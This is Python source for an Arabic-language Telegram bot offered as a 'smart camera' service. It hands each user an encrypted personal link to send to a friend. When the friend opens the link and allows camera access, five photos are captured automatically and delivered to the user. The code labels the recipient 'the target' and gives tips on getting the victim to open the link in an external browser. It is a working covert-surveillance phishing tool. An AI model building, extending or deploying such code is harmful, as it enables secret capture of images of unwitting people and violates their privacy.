import time
import threading
import io
import json
import glob
import os
from datetime import datetime, timedelta
from collections import defaultdict
import telebot
from telebot.types import BotCommand, BotCommandScopeDefault, BotCommandScopeChat, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from config import TOKEN, DEVELOPER_CHAT_ID, BASE_URL, logger, load_data, save_data
from encryption import encrypt_id

bot = telebot.TeleBot(TOKEN)

# إعدادات القناة للتحقق من الاشتراك الإجباري
CHANNEL_USERNAME = "@KhaldounSoft"
CHANNEL_URL = "https://t.me/KhaldounSoft"

# تحميل البيانات
data = load_data()
user_stats = data.get("user_stats", {})
total_photos_received = data.get("total_photos_received", 0)

# تحديث وقت بدء البوت إذا كان أول مرة
if not data.get("first_start"):
    data["first_start"] = datetime.now().isoformat()
    save_data(data)

# قفل لمنع التزاحم في حفظ البيانات
data_lock = threading.Lock()

# تخزين آخر تحديث لملف البوت
last_profile_update = {'last_update': 0}

# تخزين أوامر المستخدمين للحد من السرعة
user_commands = defaultdict(list)

def parse_date(date_value):
    """تحويل التاريخ من نص إلى كائن datetime"""
    if isinstance(date_value, str):
        return datetime.fromisoformat(date_value)
    return date_value

def rate_limit(user_id, limit=5, period=60):
    """التحقق من عدم تجاوز حد الأوامر (5 أوامر في الدقيقة افتراضياً)"""
    now = datetime.now()
    user_commands[user_id] = [t for t in user_commands[user_id] if now - t < timedelta(seconds=period)]
    
    if len(user_commands[user_id]) >= limit:
        return False
    
    user_commands[user_id].append(now)
    return True

def get_user_display_names(from_user):
    """دالة مخصصة لمعالجة جلب الاسم واسم المستخدم بدقة"""
    first_name = from_user.first_name or ""
    last_name = from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = from_user.username or ""

    # الاسم المعروض
    if full_name:
        display_name = full_name
    elif username:
        display_name = f"@{username}"
    else:
        display_name = "مستخدم"

    # اسم المستخدم مع @ إن وجد
    handle_text = f"(@{username})" if username else ""

    return display_name, username, handle_text

def is_subscribed(user_id):
    """التحقق مما إذا كان المستخدم مشتركاً في القناة أم لا"""
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        logger.error(f"Error checking subscription for {user_id}: {e}")
        # في حال حدوث خطأ في الوصول للقناة يُسمح للمستخدم لتجنب تعطيل البوت
        return True

def backup_data():
    """إنشاء نسخة احتياطية تلقائية للبيانات"""
    try:
        backup_file = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        import shutil
        shutil.copy('data.json', backup_file)
        logger.info(f"Backup created: {backup_file}")
        
        # الاحتفاظ بآخر 10 نسخ فقط
        backups = sorted(glob.glob('backup_*.json'))
        for old_backup in backups[:-10]:
            os.remove(old_backup)
            logger.info(f"Removed old backup: {old_backup}")
    except Exception as e:
        logger.error(f"Failed to create backup: {e}")

def save_user_data():
    """حفظ بيانات المستخدمين مع قفل لمنع التزاحم"""
    with data_lock:
        data["user_stats"] = user_stats
        data["total_photos_received"] = total_photos_received
        data["total_users"] = len(user_stats)
        save_data(data)

def setup_bot_commands():
    """إعداد قائمة الأوامر التي تظهر في مربع الكتابة"""
    try:
        bot.delete_my_commands()
        
        general_commands = [
            BotCommand("start", "🚀 بدء استخدام البوت"),
            BotCommand("stats", "📊 إحصائياتك الشخصية"),
            BotCommand("help", "💡 كيفية الاستخدام والمساعدة")
        ]
        
        bot.set_my_commands(general_commands, scope=BotCommandScopeDefault())
        
        if DEVELOPER_CHAT_ID:
            developer_commands = [
                BotCommand("adminstats", "📈 إحصائيات النظام الشاملة"),
                BotCommand("broadcast", "📢 إرسال إشعار للجميع"),
                BotCommand("userslist", "👥 إدارة قائمة المستخدمين"),
                BotCommand("exportdata", "📤 تصدير القاعدة"),
                BotCommand("health", "🏥 حالة النظام ومدة التشغيل")
            ]
            bot.set_my_commands(developer_commands, scope=BotCommandScopeChat(chat_id=DEVELOPER_CHAT_ID))
        
        logger.info("Bot commands setup completed")
    except Exception as e:
        logger.error(f"Failed to setup bot commands: {e}")

def update_bot_profile(force=False):
    """تحديث اسم البوت ووصفه مع عدد المستخدمين ورابط القناة"""
    current_time = time.time()
    
    if not force and current_time - last_profile_update.get('last_update', 0) < 300:
        return
    
    try:
        total_users = len(user_stats)
        
        bot.set_my_description(
            f"📸 *بوت الكاميرا الذكية والتفاعل السريع*\n\n"
            f"⚡ التقاط صور مباشرة وإرسالها بأعلى سرعة وأمان تام.\n\n"
            f"📊 *إحصائيات المباشرة:*\n"
            f"👥 عدد المشتركين: {total_users}\n"
            f"🖼️ الصور الملتقطة: {total_photos_received}\n\n"
            f"🌐 *تابع جديد البرمجيات والتحديثات:*\n"
            f"عالم البرمجيات | Software World\n"
            f"{CHANNEL_URL}"
        )
        
        bot.set_my_short_description(
            f"📸 الكاميرا الذكية | {total_users} مستخدم | {CHANNEL_USERNAME}"
        )
        
        last_profile_update['last_update'] = current_time
        logger.info(f"Bot profile updated - Users: {total_users}")
    except Exception as e:
        logger.error(f"Failed to update bot profile: {e}")

def notify_developer(message_text, parse_mode="Markdown"):
    """إرسال إشعار للمطور"""
    try:
        bot.send_message(DEVELOPER_CHAT_ID, message_text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"Failed to notify developer: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """رسالة الترحيب والتحقق من الاشتراك"""
    user_id = message.chat.id
    
    if not rate_limit(user_id):
        bot.reply_to(message, "⚠️ *تنبيه:* أنت ترسل الأوامر بسرعة فائقة، يرجى الانتظار قليلاً.", parse_mode="Markdown")
        return

    # 🛑 التحقق من الاشتراك الإجباري بالقناة
    if not is_subscribed(user_id):
        markup = InlineKeyboardMarkup(row_width=1)
        btn_channel = InlineKeyboardButton(text="📢 انضمام للقناة الرسمية", url=CHANNEL_URL)
        btn_check = InlineKeyboardButton(text="🔄 تم الاشتراك (تحقق الآن)", callback_data="check_sub")
        markup.add(btn_channel, btn_check)
        
        sub_message = (
            f"🔒 *عذراً عزيزي، لاستخدام البوت يجب عليك الاشتراك بقناتنا الرسمية أولاً:*\n\n"
            f"📌 *القناة:* [عالم البرمجيات | Software World]({CHANNEL_URL})\n"
            f"👇 اضغط على زر الانضمام أدناه ثم اضغط على زر التحقق."
        )
        bot.send_message(user_id, sub_message, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)
        return

    # معالجة جلب اسم المستخدم واليوزر بدقة
    user_name, username, handle_text = get_user_display_names(message.from_user)
    is_new_user = False

    if user_id not in user_stats:
        is_new_user = True
        user_stats[user_id] = {
            "name": user_name,
            "username": username or "غير محدد",
            "photo_count": 0,
            "first_seen": datetime.now().isoformat(),
            "last_active": datetime.now().isoformat(),
            "total_links_shared": 0
        }
        save_user_data()
        update_bot_profile()
        
        notify_message = (
            f"✨ *مستخدم جديد انضم للبوت!* ✨\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 *الاسم:* {user_name}\n"
            f"🆔 *المعرف:* `{user_id}`\n"
            f"📝 *اليوزر:* @{username if username else 'لا يوجد'}\n"
            f"📅 *التاريخ:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"👥 *إجمالي المستخدمين:* {len(user_stats)}"
        )
        notify_developer(notify_message)
        
        if len(user_stats) % 10 == 0:
            backup_data()
    else:
        # تحديث الاسم واليوزر باستمرار لضمان صحة البيانات
        user_stats[user_id]["last_active"] = datetime.now().isoformat()
        user_stats[user_id]["name"] = user_name
        user_stats[user_id]["username"] = username or "غير محدد"
        save_user_data()

    encrypted = encrypt_id(user_id)
    personal_link = f"{BASE_URL}?q={encrypted}"

    user_stats[user_id]["total_links_shared"] = user_stats[user_id].get("total_links_shared", 0) + 1
    save_user_data()

    markup = InlineKeyboardMarkup(row_width=2)
    copy_button = InlineKeyboardButton(text="📋 انسخ رابطك الخفي", callback_data=f"copy_{encrypted}")
    channel_button = InlineKeyboardButton(text="📢 عالم البرمجيات", url=CHANNEL_URL)
    help_button = InlineKeyboardButton(text="💡 التعليمات", callback_data="help")
    stats_button = InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
    
    markup.add(copy_button)
    markup.add(channel_button)
    markup.add(help_button, stats_button)

    total_users = len(user_stats)
    
    response = (
        f"👋 *أهلاً بك يا {user_name}* {handle_text}! في بوت الكاميرا الذكية 📸\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 *فكرة البوت:* \n"
        f"قم بنسخ الرابط وشاركه مع صديقك، بمجرد أن يفتحه سيتم التقاط 5 صور تلقائياً من الكاميرا وإرسالها إليك فوراً بحماية وتشفير تام 🔒\n\n"
        f"🔗 *رابطك الخاص جاهز:* \n"
        f"`{personal_link}`\n\n"
        f"📌 *خطوات التشغيل السريعة:*\n"
        f"1️⃣ قم بنسخ الرابط أعلاه.\n"
        f"2️⃣ أرسله لصديقك في محادثة.\n"
        f"3️⃣ سيبدأ البوت بنقل الصور إليك مباشرة!\n\n"
        f"⚠️ *ملاحظة مهمة:* ينصح بفتح الرابط بمتصفح خارجي (Chrome / Safari) لتتم العملية بنجاح.\n\n"
        f"📢 *القناة الرسمية:* [Software World]({CHANNEL_URL})"
    )
    bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)
    logger.info(f"User started: {user_name} (ID: {user_id}) - New: {is_new_user}")

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def check_subscription_callback(call):
    """معالجة زر التحقق من الاشتراك الإجباري"""
    user_id = call.from_user.id
    
    if is_subscribed(user_id):
        bot.answer_callback_query(call.id, "✅ شكراً لاشتراكك! أهلاً بك في البوت.", show_alert=False)
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        send_welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ لم يتم العثور على اشتراكك بعد! يرجى الانضمام للقناة أولاً.", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
def copy_link(call):
    """نسخ الرابط عند الضغط على الزر"""
    try:
        encrypted = call.data.replace("copy_", "")
        if not encrypted:
            raise ValueError("Empty encrypted data")
        
        personal_link = f"{BASE_URL}?q={encrypted}"
        
        bot.answer_callback_query(call.id, "📋 تم النسخ بنجاح!")
        
        bot.send_message(
            call.message.chat.id,
            f"📋 *رابطك الشخصي جاهز للنسخ:*\n\n"
            f"`{personal_link}`\n\n"
            f"🚀 *أرسله الآن لأصدقائك للبدء!*",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Error in copy_link: {e}")
        bot.answer_callback_query(call.id, "❌ حدث خطأ، يرجى المحاولة لاحقاً")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    """عرض الإحصائيات بتصميم مميز وببيانات دقيقة"""
    if not rate_limit(message.chat.id):
        bot.reply_to(message, "⏰ يرجى الانتظار قليلاً قبل إعادة استخدام الأمر.")
        return
    
    user_id = message.chat.id
    
    # تحديث الاسم الحالي عند فتح الإحصائيات
    user_name, username, handle_text = get_user_display_names(message.from_user)
    
    if user_id in user_stats:
        # تحديث الحقول المسجلة
        user_stats[user_id]["name"] = user_name
        user_stats[user_id]["username"] = username or "غير محدد"
        save_user_data()
        
        stat = user_stats[user_id]
        first_seen = parse_date(stat['first_seen'])
        last_active = parse_date(stat['last_active'])
        total_users = len(user_stats)
        
        username_display = f"@{stat['username']}" if stat.get('username') and stat.get('username') != "غير محدد" else "لا يوجد"
        
        response = (
            f"📊 *لوحة إحصائياتك الشخصية*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 *الاسم:* {stat['name']}\n"
            f"📝 *اليوزر:* {username_display}\n"
            f"🆔 *معرف الحساب (ID):* `{user_id}`\n"
            f"📸 *الصور المستلمة:* `{stat['photo_count']}` صورة\n"
            f"🔗 *عدد مشاركات الرابط:* `{stat.get('total_links_shared', 0)}` مرة\n"
            f"📅 *تاريخ الانضمام:* `{first_seen.strftime('%Y-%m-%d %H:%M')}`\n"
            f"🕐 *آخر تفاعل:* `{last_active.strftime('%Y-%m-%d %H:%M')}`\n\n"
            f"🌐 *إحصائيات البوت العامة:*\n"
            f"👥 *المستخدمين:* `{total_users}` | 🖼️ *إجمالي الصور:* `{total_photos_received}`"
        )
    else:
        response = "❌ لا توجد إحصائيات مسجلة. اضغط /start للبدء."
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['adminstats'])
def admin_stats(message):
    """إحصائيات المطور"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر مخصص لإدارة النظام فقط!")
        return
    
    total_users = len(user_stats)
    total_photos = total_photos_received
    
    today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    week_ago = (datetime.now() - timedelta(days=7)).replace(hour=0, minute=0, second=0, microsecond=0)
    
    active_today = sum(1 for u in user_stats.values() if parse_date(u['last_active']) > today)
    active_week = sum(1 for u in user_stats.values() if parse_date(u['last_active']) > week_ago)
    
    top_users = sorted(user_stats.items(), key=lambda x: x[1].get('photo_count', 0), reverse=True)[:5]
    top_users_text = ""
    for i, (uid, stat) in enumerate(top_users, 1):
        top_users_text += f"  {i}. {stat['name']} ➔ `{stat.get('photo_count', 0)}` صورة\n"
    
    first_start = parse_date(data.get("first_start", datetime.now().isoformat()))
    
    response = (
        f"⚙️ *لوحة تحكم المطور والنظام*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 *إجمالي المشتركين:* `{total_users}`\n"
        f"🖼️ *إجمالي الصور الملتقطة:* `{total_photos}`\n"
        f"🔥 *النشطين اليوم:* `{active_today}` | *هذا الأسبوع:* `{active_week}`\n\n"
        f"🏆 *أعلى 5 مستخدمين تفاعلاً:*\n{top_users_text}\n"
        f"📅 *تشغيل البوت الأول:* `{first_start.strftime('%Y-%m-%d %H:%M')}`\n"
        f"🕐 *وقت السيرفر الحالي:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
    )
    bot.send_message(DEVELOPER_CHAT_ID, response, parse_mode="Markdown")

@bot.message_handler(commands=['userslist'])
def users_list(message):
    """عرض قائمة المستخدمين (للمطور)"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر مخصص للمطور فقط!")
        return
    
    if not user_stats:
        bot.send_message(DEVELOPER_CHAT_ID, "📭 القائمة فارغة حالياً.")
        return
    
    show_users_page(message, 0)

def show_users_page(message, page):
    """عرض قائمة المستخدمين بصفحات"""
    PAGE_SIZE = 20
    users_list_items = list(user_stats.items())
    total_pages = (len(users_list_items) + PAGE_SIZE - 1) // PAGE_SIZE
    
    if page >= total_pages:
        page = 0
    
    start_idx = page * PAGE_SIZE
    end_idx = min(start_idx + PAGE_SIZE, len(users_list_items))
    
    users_text = f"👥 *قائمة المشتركين (صفحة {page+1} من {total_pages}):*\n━━━━━━━━━━━━━━━━━━\n\n"
    
    for uid, stat in users_list_items[start_idx:end_idx]:
        last_active = parse_date(stat['last_active'])
        users_text += f"• *{stat['name']}* (@{stat.get('username', 'لا يوجد')})\n"
        users_text += f"  🆔 `{uid}` | 📸 `{stat['photo_count']}` | 🕐 `{last_active.strftime('%Y-%m-%d')}`\n\n"
    
    markup = InlineKeyboardMarkup(row_width=2)
    nav_buttons = []
    
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"users_page_{page-1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("التالي ➡️", callback_data=f"users_page_{page+1}"))
    
    if nav_buttons:
        markup.add(*nav_buttons)
    
    if isinstance(message, telebot.types.Message):
        bot.send_message(DEVELOPER_CHAT_ID, users_text, parse_mode="Markdown", reply_markup=markup if nav_buttons else None)
    else:
        bot.edit_message_text(users_text, DEVELOPER_CHAT_ID, message.message_id, parse_mode="Markdown", reply_markup=markup if nav_buttons else None)

@bot.callback_query_handler(func=lambda call: call.data.startswith("users_page_"))
def handle_users_page(call):
    if call.message.chat.id != DEVELOPER_CHAT_ID:
        bot.answer_callback_query(call.id, "❌ أمر غير مصرح به!")
        return
    
    page = int(call.data.replace("users_page_", ""))
    show_users_page(call.message, page)
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['updateprofile'])
def update_profile(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    update_bot_profile(force=True)
    bot.reply_to(message, "✅ تم تحديث ملف البوت وملف التعريف بنجاح!")

@bot.message_handler(commands=['setphoto'])
def set_bot_photo(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    
    if not message.reply_to_message or not message.reply_to_message.photo:
        bot.reply_to(message, "❌ يرجى الرد على صورة باستخدام الأمر /setphoto")
        return
    
    photo = message.reply_to_message.photo[-1]
    try:
        bot.set_chat_photo(photo.file_id)
        bot.reply_to(message, "✅ تم تغيير صورة البوت بنجاح!")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ أثناء تغيير الصورة: {e}")

@bot.message_handler(commands=['help'])
def send_help(message):
    """دليل استخدام البوت"""
    if not rate_limit(message.chat.id):
        bot.reply_to(message, "⏰ يرجى الانتظار قليلاً.")
        return
    
    user_id = message.chat.id
    
    help_text = (
        f"💡 *دليل استخدام بوت الكاميرا الذكية*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"📌 *كيف يعمل البوت؟*\n"
        f"1️⃣ قم بطلب رابطك الخاص عبر الأمر /start.\n"
        f"2️⃣ انسخ الرابط وأرسله في المحادثة المستهدفة.\n"
        f"3️⃣ عند فتح الرابط والسماح للكاميرا، يلتقط البوت 5 صور متتالية وتصلك هنا مباشرةً.\n\n"
        f"🚨 *تعليمات هامة لضمان العمل:*\n"
        f"• يجب فتح الرابط متصفح خارجي مثل (Google Chrome / Safari).\n"
        f"• الكاميرا لن تعمل إذا تم فتح الرابط بمتصفح التليجرام المدمج الداخلي.\n\n"
        f"📢 *القناة الرسمية:* [عالم البرمجيات]({CHANNEL_URL})"
    )
    
    if user_id == DEVELOPER_CHAT_ID:
        help_text += (
            f"\n\n👨‍💻 *أوامر المطور الإدارية:*\n"
            f"• /adminstats - إحصائيات النظام الشاملة\n"
            f"• /broadcast - بث رسالة جماعية\n"
            f"• /userslist - عرض وتصفح المشتركين\n"
            f"• /updateprofile - تحديث معلومات البوت\n"
            f"• /exportdata - تصدير النسخة الاحتياطية\n"
            f"• /health - حالة وسرعة السيرفر"
        )
    
    bot.send_message(user_id, help_text, parse_mode="Markdown", disable_web_page_preview=True)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    """بث إشعار عام للمستخدمين"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        return

    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ *الاستخدام الصحيح:*\n`/broadcast نص الرسالة هنا`", parse_mode="Markdown")
        return
    
    if not user_stats:
        bot.reply_to(message, "❌ لا يوجد مستخدمون لإرسال الرسالة إليهم.")
        return

    broadcast_text = parts[1]
    success, fail = 0, 0
    status_msg = bot.reply_to(message, "⏳ *جاري بدء عملية البث الجماعي...*", parse_mode="Markdown")
    
    for uid in list(user_stats.keys()):
        try:
            bot.send_message(uid, f"📢 *إشعار هام من الإدارة:*\n\n{broadcast_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.05)
        except Exception:
            fail += 1
    
    result_text = (
        f"✅ *تمت عملية البث بنجاح!*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🟢 *الناجحة:* `{success}`\n"
        f"🔴 *الفاشلة:* `{fail}`"
    )
    bot.edit_message_text(result_text, DEVELOPER_CHAT_ID, status_msg.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['health'])
def health_check(message):
    """فحص حالة التشغيل"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    
    uptime = datetime.now() - parse_date(data.get("first_start", datetime.now().isoformat()))
    
    health_status = (
        f"🏥 *تقرير حالة السيرفر والنظام*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🟢 *الحالة:* يعمل بكفاءة استثنائية\n"
        f"👥 *عدد المشتركين:* `{len(user_stats)}`\n"
        f"🖼️ *إجمالي الصور:* `{total_photos_received}`\n"
        f"⏱️ *مدة التشغيل المتواصل:* `{uptime.days}` يوم و `{uptime.seconds // 3600}` ساعة\n"
        f"📅 *التحديث:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
    )
    bot.reply_to(message, health_status, parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    """معالجة استقبال الصور الملتقطة"""
    global total_photos_received
    user_id = message.chat.id
    
    user_name, username, _ = get_user_display_names(message.from_user)

    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["name"] = user_name
        user_stats[user_id]["username"] = username or "غير محدد"
        user_stats[user_id]["last_active"] = datetime.now().isoformat()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "username": username or "غير محدد",
            "photo_count": 1,
            "first_seen": datetime.now().isoformat(),
            "last_active": datetime.now().isoformat(),
            "total_links_shared": 0
        }
    
    save_user_data()
    
    total_photos_received += 1
    save_user_data()
    update_bot_profile()

    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024

    caption = (
        f"📸 *تم التقاط واستلام صورة جديدة!*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 *المستهدف:* {user_name}\n"
        f"🆔 *المعرف:* `{user_id}`\n"
        f"📏 *حجم الملف:* `{file_size:.1f} KB`\n"
        f"📊 *إجمالي صورك:* `{user_stats[user_id]['photo_count']}` صورة"
    )
    bot.reply_to(message, caption, parse_mode="Markdown")
    logger.info(f"Received photo from {user_name} (ID: {user_id})")

@bot.message_handler(commands=['exportdata'])
def export_data(message):
    """تصدير القاعدة للمطور"""
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    
    try:
        export_data_dict = {
            "export_date": datetime.now().isoformat(),
            "total_users": len(user_stats),
            "total_photos": total_photos_received,
            "user_stats": user_stats,
            "first_start": data.get("first_start")
        }
        
        file = io.BytesIO(json.dumps(export_data_dict, ensure_ascii=False, indent=2).encode('utf-8'))
        file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        bot.send_document(DEVELOPER_CHAT_ID, file, caption="📤 *تصدير النسخة الاحتياطية لقاعدة البيانات*", parse_mode="Markdown")
        logger.info("Data exported successfully")
    except Exception as e:
        logger.error(f"Failed to export data: {e}")
        bot.reply_to(message, f"❌ حدث خطأ أثناء التصدير: {e}")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """معالجة الأزرار التفاعلية العامة"""
    try:
        if call.data == "help":
            help_msg = bot.send_message(call.message.chat.id, "⏳ *جاري التحميل...*", parse_mode="Markdown")
            send_help(help_msg)
        elif call.data == "stats":
            stats_msg = bot.send_message(call.message.chat.id, "⏳ *جاري التحميل...*", parse_mode="Markdown")
            show_stats(stats_msg)
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Error in callback handler: {e}")
        bot.answer_callback_query(call.id, "❌ حدث خطأ أثناء التنفيذ")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """معالجة الرسائل العامة"""
    if not rate_limit(message.chat.id, limit=10, period=60):
        bot.reply_to(message, "⏰ أنت ترسل الرسائل بسرعة، انتظر لبرهة.")
        return
    
    user_name, _, _ = get_user_display_names(message.from_user)
    
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❌ *أمر غير معروف!*\n\nاستخدم /start للبدء أو /help للتعليمات.", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"أهلاً بك {user_name}! 👋\n\nاضغط /start للحصول على رابطك الخاص، أو استخدم القائمة (Menu) للوصول لكافة الخيارات.", parse_mode="Markdown")

def get_bot():
    return bot, user_stats, total_photos_received

# تشغيل البوت
if __name__ == "__main__":
    setup_bot_commands()
    update_bot_profile(force=True)
    logger.info("Bot started successfully!")
    
    backup_data()
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        logger.error(f"Bot polling error: {e}")
        time.sleep(10)
        logger.info("Restarting bot...")
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
